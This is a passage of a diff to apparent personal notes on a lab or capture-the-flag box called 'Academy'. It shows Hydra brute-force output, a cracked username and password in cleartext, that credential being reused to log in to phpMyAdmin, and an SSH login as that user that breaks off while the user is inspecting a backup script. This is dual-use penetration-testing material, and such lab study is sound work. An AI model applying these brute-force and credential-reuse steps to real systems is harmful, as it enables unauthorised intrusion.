@@ -1831,15 +1831,21 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-21 09:22:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-21 09:22:43
 ```
+	
 - so the password is for `grimmie`
 ```
 grimmie:My_V3ryS3cur3_P4ss
 ```
+	
+- wait lets see if we can login to `http://10.0.2.6/phpmyadmin/index.php` with these creds 
+- WE SURE CAN 
+	![[Academy-phpMyadminLoginSuccessful.png]] 
 - gonna ssh into the server as `grimmie` now. lets see what privilages he has 
 ```
 grimmie@academy:~$ groups
 administrator cdrom floppy audio dip video plugdev netdev
 ```
+	
 - hmmm seems like `grimmie` is an admin. also has a `backup.sh` file in his home directory. lets see what it does
 ```sh title:"backup.sh" fold
 grimmie@academy:~$ cat backup.sh 
